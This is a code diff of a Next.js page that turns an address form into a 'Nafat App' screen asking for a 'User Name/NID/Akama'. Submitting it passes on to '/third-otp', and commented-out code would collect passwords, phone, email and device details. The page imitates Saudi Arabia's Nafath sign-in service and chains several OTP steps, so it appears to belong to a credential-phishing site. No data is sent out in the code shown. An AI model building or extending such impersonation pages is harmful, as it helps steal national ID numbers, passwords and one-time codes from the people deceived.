@@ -1,6 +1,8 @@
 import { Pagination, Autoplay, A11y, EffectCards } from 'swiper/modules'
 import { Swiper, SwiperSlide } from 'swiper/react'
 import SwiperCore from 'swiper'
+import { FaArrowRightLong } from 'react-icons/fa6'
+import { useRouter, useSearchParams } from 'next/navigation'
 
 // Import Swiper styles
 import 'swiper/css'
@@ -9,40 +11,28 @@ import 'swiper/css/pagination'
 import 'swiper/css/scrollbar'
 import 'swiper/css/free-mode'
 import 'swiper/css/thumbs'
-import { FaArrowRightLong } from 'react-icons/fa6'
-import { useEffect, useState } from 'react'
-import { useRouter, useSearchParams } from 'next/navigation'
+import toast from 'react-hot-toast'
 
-const Address = () => {
+const NafatApp = () => {
+  SwiperCore.use([Autoplay])
   const router = useRouter()
   const searchParams = useSearchParams()
-
   const params = new URLSearchParams(searchParams)
-
-  console.log(
-    'searchParams',
-    params.forEach((value, name) => console.log(name, value)),
-  )
-
-  SwiperCore.use([Autoplay])
-  // a countdown timer function
-  const [time, setTime] = useState(180)
-  useEffect(() => {
-    const timer = setInterval(() => {
-      setTime((prevTime) => {
-        if (prevTime === 0) {
-          clearInterval(timer)
-          return 0
-        }
-        return prevTime - 1
-      })
-    }, 1000)
-    return () => clearInterval(timer)
-  }, [])
 
   const handleSubmit = (e) => {
     e.preventDefault()
-    router.push('/second-otp')
+    // const submitData = {
+    //   identity: e.target.identity.value,
+    //   password: e.target.password.value,
+    //   confirmPassword: e.target.confirmPassword.value,
+    //   phone: e.target.phone.value,
+    //   email: e.target.email.value,
+    //   model: params.get('model'),
+    //   color: params.get('color'),
+    //   storage: params.get('storage'),
+    //   nationality: params.get('nationality'),
+    // }
+    router.push('/third-otp')
   }
 
   return (
@@ -92,57 +82,22 @@ const Address = () => {
         </SwiperSlide>
       </Swiper>
       <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
-        <h1 className="text-4xl font-bold text-gray-600 mt-10">User Address</h1>
-
+        <h1 className="text-4xl font-bold text-gray-600 mt-10">Nafat App</h1>
         <form onSubmit={handleSubmit} className="w-3/4 my-14">
-          <div className="grid md:grid-cols-2 md:gap-6">
-            <div className="relative z-0 w-full mb-6 group">
-              <input
-                type="text"
-                name="city"
-                id="city"
-                className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
-                placeholder=""
-                required
-              />
-              <label
-                htmlFor="city"
-                className="z-10 peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
-              >
-                City
-              </label>
-            </div>
-            <div className="relative z-0 w-full mb-6 group">
-              <input
-                type="text"
-                name="country"
-                id="country"
-                className="block py-2.5 px-0 w-full text-sm bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
-                placeholder=""
-                required
-              />
-              <label
-                htmlFor="country"
-                className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
-              >
-                Country
-              </label>
-            </div>
-          </div>
           <div className="relative z-0 w-full mb-6 group">
             <input
-              type="text"
-              name="addressDetails"
-              id="addressDetails"
+              type="number"
+              name="identity"
+              id="identity"
               className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
               placeholder=""
               required
             />
             <label
-              htmlFor="addressDetails"
+              htmlFor="identity"
               className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
             >
-              Address Details
+              User Name/NID/Akama
             </label>
           </div>
           <button
@@ -158,4 +113,4 @@ const Address = () => {
   )
 }
 
-export default Address
+export default NafatApp
